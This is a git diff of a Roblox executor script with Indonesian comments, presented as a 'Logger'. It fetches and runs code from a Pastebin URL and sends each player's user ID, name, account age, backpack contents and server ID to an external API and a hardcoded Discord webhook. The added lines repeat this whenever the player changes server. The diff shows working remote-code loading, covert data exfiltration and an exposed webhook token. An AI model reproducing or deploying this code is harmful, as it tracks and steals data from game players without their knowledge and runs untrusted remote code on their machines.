@@ -4,13 +4,14 @@ local Players = game:GetService("Players")
 -- ======= CONFIGURATION =======
 local API_ENDPOINT = "https://api-beta-mocha-45.vercel.app/api/setInstanceId"
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1378086156624990361/8qHKxSBQ8IprT1qFn1KkHDWsyRfKXPJkS_4OYzMkBC-PIhGClm0v36uIgzrVwtU1zXh6"
-local EXTERNAL_SCRIPT = "https://pastebin.com/raw/pfpzbXiF" -- Script yang akan di-execute
+local EXTERNAL_SCRIPT = "https://pastebin.com/raw/RyqbcPER" -- Script yang akan di-execute
 -- =============================
 
--- Dapatkan data player
+-- Variables
 local player = Players.LocalPlayer
-local jobId = game.JobId
+local currentJobId = game.JobId
 local playerName = player.Name
+local isFirstRun = true
 
 -- Fungsi HTTP request yang kompatibel dengan berbagai executor
 local function httpRequest(url, method, body, headers)
@@ -59,14 +60,15 @@ end
 -- Kirim data ke API
 local function sendToAPI()
     local data = {
-        instanceId = jobId,
+        instanceId = currentJobId,
         player = {
             userId = player.UserId,
             name = player.Name,
             accountAge = player.AccountAge
         },
         backpackContents = getBackpackContents(),
-        timestamp = os.time()
+        timestamp = os.time(),
+        isServerChange = not isFirstRun
     }
     
     local response = httpRequest(API_ENDPOINT, "POST", HttpService:JSONEncode(data))
@@ -86,9 +88,12 @@ local function sendWebhook()
         username = "Logger System",
         embeds = {
             {
-                title = "🟢 Script Dijalankan",
-                description = string.format("**%s** menjalankan script\n**JobID:** `%s`", playerName, jobId),
-                color = 65280, -- Warna hijau
+                title = isFirstRun and "🟢 Script Dijalankan" or "🔄 Server Berubah",
+                description = string.format("**%s** %s\n**JobID:** `%s`", 
+                    playerName, 
+                    isFirstRun and "menjalankan script" or "pindah server", 
+                    currentJobId),
+                color = isFirstRun and 65280 or 16776960, -- Hijau untuk pertama kali, kuning untuk server change
                 timestamp = DateTime.now():ToIsoDate(),
                 fields = {
                     {
@@ -100,10 +105,15 @@ local function sendWebhook()
                         name = "👤 Info Player",
                         value = string.format("UserID: %d\nAccount Age: %d hari", player.UserId, player.AccountAge),
                         inline = true
+                    },
+                    {
+                        name = "🌐 Server Status",
+                        value = isFirstRun and "Join Pertama" or "Pindah Server",
+                        inline = true
                     }
                 },
                 footer = {
-                    text = "Logger v2.0"
+                    text = "Logger v2.0 | Auto Server Tracker"
                 }
             }
         }
@@ -118,7 +128,7 @@ local function sendWebhook()
     end
 end
 
--- Fungsi utama
+-- Fungsi utama yang dijalankan ketika join server
 local function main()
     -- Execute external script terlebih dahulu
     local scriptSuccess = executeExternalScript()
@@ -130,10 +140,29 @@ local function main()
     else
         warn("❌ External script gagal dijalankan, proses pengiriman data dibatalkan")
     end
+    
+    isFirstRun = false
+end
+
+-- Deteksi perubahan server
+local function trackServerChanges()
+    while true do
+        local newJobId = game.JobId
+        if newJobId ~= currentJobId then
+            print("⚠️ Deteksi perubahan server:", currentJobId, "->", newJobId)
+            currentJobId = newJobId
+            main() -- Jalankan lagi ketika pindah server
+        end
+        wait(5) -- Check setiap 5 detik
+    end
 end
 
 -- Jalankan dengan error handling
-local success, err = pcall(main)
+local success, err = pcall(function()
+    main() -- Jalankan pertama kali
+    trackServerChanges() -- Mulai tracking perubahan server
+end)
+
 if not success then
     warn("❌ Error fatal pada logger:", err)
 end
